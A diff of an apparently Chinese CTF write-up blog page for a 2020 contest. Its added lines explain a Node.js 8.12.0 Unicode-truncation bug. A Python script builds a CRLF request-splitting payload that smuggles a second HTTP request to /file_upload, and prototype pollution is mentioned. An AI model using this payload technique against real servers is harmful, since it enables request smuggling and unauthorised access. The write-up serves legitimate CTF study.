@@ -57,7 +57,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/23/fcbLvmts2kKUVMG.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/gBSrLY6twR7mZFb.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/02/23/wXihW5lgy9SPaMp.png">
-<meta property="og:updated_time" content="2020-02-25T06:24:42.173Z">
+<meta property="og:updated_time" content="2020-02-25T12:36:45.073Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2020新春战疫-网络安全公益赛-3">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/23/RghZcjEozkxmWsp.png">
@@ -210,6 +210,11 @@
 <p>作罢</p>
 <p>======================分割线</p>
 <p>赵师傅发了脚本，CRLF的编码和wp不太一样</p>
+<blockquote>
+<p>原理： <a href="https://xz.aliyun.com/t/2894" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894</a> </p>
+<p>在nodejs<code>8.12.0</code>这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说</p>
+<p>假如我们传入<code>chr(0xffa0)</code>处理后会被截断为<code>chr(0xa0)</code>，并且这个<code>0xff</code>可更换</p>
+</blockquote>
 <p>测试CRLF</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">a = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>))<span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
 
@@ -239,7 +244,7 @@
 
 <h3 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h3><p>明显的JavaScript原型链污染</p>
 <p>留下了不学无术的眼泪.jpg</p>
-<p>=========分割线</p>
+<p>=================分割线</p>
 <blockquote>
 <p>JavaScript原型链污染： <a href="https://glotozz.github.io/2020/02/25/JavaScript原型链污染/">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a> </p>
 </blockquote>
